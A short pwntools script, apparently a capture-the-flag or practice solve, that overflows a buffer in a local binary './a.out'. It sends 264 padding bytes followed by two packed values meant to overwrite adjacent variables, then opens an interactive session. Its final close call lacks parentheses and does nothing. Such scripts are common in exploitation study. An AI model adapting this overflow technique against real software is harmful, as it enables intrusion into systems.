from pwn import *
r1=process('./a.out')
r2=b's'*264+p32(0x1337)+p32(0x69696969)
r1.sendline(r2)
r1.interactive()
r1.close
